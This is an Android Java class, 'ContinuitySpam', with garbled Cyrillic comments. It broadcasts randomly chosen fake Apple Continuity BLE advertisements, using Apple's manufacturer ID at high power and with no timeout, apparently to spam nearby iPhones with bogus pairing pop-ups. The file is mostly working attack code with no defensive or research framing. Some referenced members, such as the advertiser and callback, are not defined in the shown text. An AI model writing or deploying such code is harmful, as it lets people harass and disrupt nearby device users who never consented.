public class ContinuitySpam {
    
    public void startSpam() {
        // –ò—Å–ø–æ–ª—å–∑—É–µ–º —Å–ª—É—á–∞–π–Ω–æ–µ —à—É—Ç–æ—á–Ω–æ–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ –≤–º–µ—Å—Ç–æ —Ñ–∏–∫—Å–∏—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ
        ContinuityDevice jokeDevice = ContinuityDevice.getRandomJokeDevice();
        
        String deviceName = jokeDevice.getName();
        String hexPayload = jokeDevice.getValue();
        
        // –õ–æ–≥–∏—Ä—É–µ–º –∫–∞–∫–æ–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ –∑–∞–ø—É—â–µ–Ω–æ
        Log.d("CONTINUITY_SPAM", "üöÄ Starting: " + deviceName);
        
        // –ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä—É–µ–º hex —Å—Ç—Ä–æ–∫—É –≤ byte array
        byte[] payload = hexStringToByteArray(hexPayload);
        
        // –ó–∞–ø—É—Å–∫–∞–µ–º advertising
        advertiseContinuityDevice(payload, deviceName);
    }
    
    private void advertiseContinuityDevice(byte[] payload, String deviceName) {
        try {
            AdvertiseData advertiseData = new AdvertiseData.Builder()
                .setIncludeDeviceName(true)
                .setIncludeTxPowerLevel(true)
                .addManufacturerData(0x004C, payload) // Apple Manufacturer ID
                .build();
                
            AdvertiseSettings advertiseSettings = new AdvertiseSettings.Builder()
                .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
                .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
                .setConnectable(false)
                .setTimeout(0)
                .build();
                
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ
            showToast("iOS: " + deviceName);
            
            // –ó–∞–ø—É—Å–∫–∞–µ–º advertising
            bluetoothLeAdvertiser.startAdvertising(advertiseSettings, advertiseData, advertiseCallback);
            
        } catch (Exception e) {
            Log.e("CONTINUITY_SPAM", "Error starting spam: " + e.getMessage());
        }
    }
    
    // –í—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω—ã–π –º–µ—Ç–æ–¥ –¥–ª—è –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏–∏ hex —Å—Ç—Ä–æ–∫–∏ –≤ byte array
    private byte[] hexStringToByteArray(String s) {
        int len = s.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
                                 + Character.digit(s.charAt(i+1), 16));
        }
        return data;
    }
    
    private void showToast(String message) {
        // –≠—Ç–æ—Ç –º–µ—Ç–æ–¥ –Ω—É–∂–Ω–æ —Ä–µ–∞–ª–∏–∑–æ–≤–∞—Ç—å –≤ MainActivity
        // –ò–ª–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å Log –¥–ª—è –æ—Ç–ª–∞–¥–∫–∏
        Log.i("CONTINUITY_SPAM", message);
    }
}